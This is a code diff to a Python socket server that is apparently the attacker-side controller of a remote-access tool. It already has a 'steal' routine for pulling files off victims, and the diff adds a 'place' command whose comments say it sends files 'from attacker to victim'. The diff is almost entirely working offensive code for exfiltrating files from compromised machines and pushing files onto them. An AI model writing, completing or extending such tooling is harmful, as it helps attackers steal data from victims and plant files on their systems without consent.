@@ -1,4 +1,5 @@
 from socket import *
+from time import sleep
 
 HOST = ""
 PORT = 5500
@@ -12,6 +13,26 @@ def steal(sock, path):
 		file.write(f)
 		f = sock.recv(1024)
 	file.close()	
+
+
+
+def place(sock, path):
+	
+
+	file = open(path, "rb")
+
+	print("read", path)
+	
+	f = file.read(1024)
+
+	while f:
+		sock.send(f)
+		f = file.read(1024)
+	
+	file.close()
+	sleep(0.2)
+
+	sock.send("end".encode())
 	
 
 
@@ -50,9 +71,13 @@ def main():
 				steal(sock, path)
 				response = b"[+] file received"
 				
+			# will send a file from attacker to victim
+			# usage place /path/on/victim /path/on/attacker
 			elif action == "place":
-				# TODO
-				pass
+				sock.send(data.encode())
+				path = data.split()[1]
+				place(sock, path)
+				response = b"[+] file sent"
 			else:
 				pass
 
